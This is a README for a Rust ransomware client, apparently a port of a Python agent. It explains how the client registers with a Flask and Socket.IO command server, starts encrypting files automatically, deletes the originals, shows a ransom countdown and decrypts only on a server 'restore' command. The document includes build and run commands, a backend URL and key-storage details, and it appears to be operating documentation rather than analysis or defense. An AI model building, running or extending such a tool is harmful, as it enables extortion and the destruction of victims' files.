# Rusty (Rust client replica of `py_simple`)

A lightweight Rust reimplementation of the Python agent. It:

- Registers with the existing Flask backend (`/publickey`) and connects via Socket.IO
- Automatically starts encryption after auth (no flags required)
- Encrypts targeted files with AES-256-GCM, writing `*.corrupted` and deleting originals
- Restores files on `restore` event and deletes the encrypted files afterward
- Shows a simple console ransom countdown (no GUI dependencies)

## Build

- Linux/macOS:

```bash
cd rusty
cargo build --release
```

- Windows (PowerShell):

```powershell
cd rusty
cargo build --release
```

The binary will be at `target/release/rusty` (or `rusty.exe` on Windows).

## Run

Environment variables (same semantics as the Python agent):

- `BACKEND_URL` – e.g., `https://sample-2ang.onrender.com` (required unless passed via CLI)
- `WORK_DIR` – directory to process (default Windows: `C:\Users\user\test\`, non-Windows: `./test`)

Examples:

```bash
# Minimal (backend from env)
BACKEND_URL=https://sample-2ang.onrender.com ./target/release/rusty

# Or explicitly
./target/release/rusty --backend https://sample-2ang.onrender.com --work-dir ./test
```

## Behavior

- On start, the client registers, connects to Socket.IO, sends `authenticate`, then immediately starts local encryption (mirroring the latest Python behavior).
- On `process` event: encrypts again if not already running.
- On `restore` event: restores original files, then deletes `*.corrupted` files, and stops the ransom countdown.

## Notes

- This client uses `rust_socketio` with default Engine.IO v4. It expects the server at the same base as `BACKEND_URL` under `/socket.io`.
- RSA key wrapping is stubbed: if a device public key is available in `/devices`, we wrap and store the AES key as base64 content in `sys_cache.dat` under the work dir (like the Python client).

## Troubleshooting

- If Socket.IO cannot connect over WebSocket, it will fall back to polling automatically.
- To verify connectivity, hit the backend `/status` and `/py_simple/devices` endpoints manually.